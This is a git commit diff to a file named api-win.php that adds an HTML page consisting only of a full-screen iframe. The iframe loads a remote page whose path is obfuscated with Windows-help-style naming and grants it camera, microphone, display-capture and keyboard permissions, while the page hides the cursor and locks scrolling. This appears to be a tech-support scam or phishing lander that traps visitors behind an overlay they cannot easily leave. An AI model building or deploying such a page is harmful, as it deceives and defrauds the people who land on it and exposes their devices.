61dc54f5227cb84bb181bd4e77c1b52864459bb3
rosioleydicondori-create <rosioleydicondori@gmail.com>
2026-06-24 15:33:19 +0530

    Update api-win.php

--- api-win.php
+++ api-win.php
@@ -26,12 +26,39 @@
   mozallowfullscreen 
   allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
 </iframe>
-<script>function enableFullscreen() {
-        const el = document.documentElement;
-        (el.requestFullscreen ||
-            el.webkitRequestFullscreen ||
-            el.mozRequestFullScreen ||
-            el.msRequestFullscreen)?.call(el);
-    }</script>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<style>
+  iframe {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    border: none;
+    top: 0;
+    left: 0;
+  cursor: none;
+}
+</style>
+
+</head>
+<body>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+
+<iframe 
+  id="f"
+  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
+  allowfullscreen 
+  webkitallowfullscreen 
+  mozallowfullscreen 
+  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+</iframe>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+</body>
+</html>
+
 </body>
 </html>
